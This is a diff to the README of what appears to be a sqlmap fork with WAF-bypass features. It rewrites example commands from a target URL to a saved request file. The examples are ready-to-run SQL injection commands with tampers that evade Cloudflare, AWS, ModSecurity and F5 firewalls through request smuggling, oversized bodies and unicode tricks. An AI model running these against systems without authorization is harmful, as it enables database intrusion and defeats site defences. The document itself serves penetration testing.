@@ -47,8 +47,8 @@ This fork includes advanced WAF bypass techniques based on recent security resea
 
 Smart WAF detection with optimized tamper selection (max 4 tampers per WAF):
 
-    python sqlmap.py -u "http://target.com/?id=1" --waf-bypass=auto
-    python sqlmap.py -u "http://target.com/?id=1" --waf-bypass=cloudflare
+    python sqlmap.py -r request.req --waf-bypass=auto
+    python sqlmap.py -r request.req --waf-bypass=cloudflare
 
 **Modes:**
 - `auto` - Waits for WAF detection, then applies specific tampers dynamically
@@ -109,33 +109,33 @@ Smart WAF detection with optimized tamper selection (max 4 tampers per WAF):
 
 ```bash
 # Bypass Cloudflare/AWS (8KB body limit)
-python sqlmap.py -u "http://target.com/?id=1" --tamper=oversizedrequest
+python sqlmap.py -r request.req --tamper=oversizedrequest
 
 # HTTP smuggling with chunked encoding
-python sqlmap.py -u "http://target.com/?id=1" --chunked --tamper=chunkextensionsmuggle
+python sqlmap.py -r request.req --chunked --tamper=chunkextensionsmuggle
 
 # Unicode bypass for pattern-matching WAFs
-python sqlmap.py -u "http://target.com/?id=1" --tamper=unicodenormalize
+python sqlmap.py -r request.req --tamper=unicodenormalize
 
 # Scientific notation bypass (ptswarm technique)
-python sqlmap.py -u "http://target.com/?id=1" --tamper=scientificnotation
+python sqlmap.py -r request.req --tamper=scientificnotation
 
 # Junk chars + line breaks for regex WAFs
-python sqlmap.py -u "http://target.com/?id=1" --tamper=junkchars,linebreaks
+python sqlmap.py -r request.req --tamper=junkchars,linebreaks
 
 # Token breaker for WAF tokenizers
-python sqlmap.py -u "http://target.com/?id=1" --tamper=tokenbreaker
+python sqlmap.py -r request.req --tamper=tokenbreaker
 
 # Auto-detect WAF and apply specific tampers dynamically
-python sqlmap.py -u "http://target.com/?id=1" --waf-bypass=auto
+python sqlmap.py -r request.req --waf-bypass=auto
 
 # Force specific WAF bypass (applies tampers immediately)
-python sqlmap.py -u "http://target.com/?id=1" --waf-bypass=cloudflare
-python sqlmap.py -u "http://target.com/?id=1" --waf-bypass=modsecurity
-python sqlmap.py -u "http://target.com/?id=1" --waf-bypass=f5
+python sqlmap.py -r request.req --waf-bypass=cloudflare
+python sqlmap.py -r request.req --waf-bypass=modsecurity
+python sqlmap.py -r request.req --waf-bypass=f5
 
 # Combined with chunked encoding
-python sqlmap.py -u "http://target.com/?id=1" --waf-bypass=auto --chunked
+python sqlmap.py -r request.req --waf-bypass=auto --chunked
 ```
 
 See [CHANGELOG_WAF_BYPASS.md](CHANGELOG_WAF_BYPASS.md) for full details.
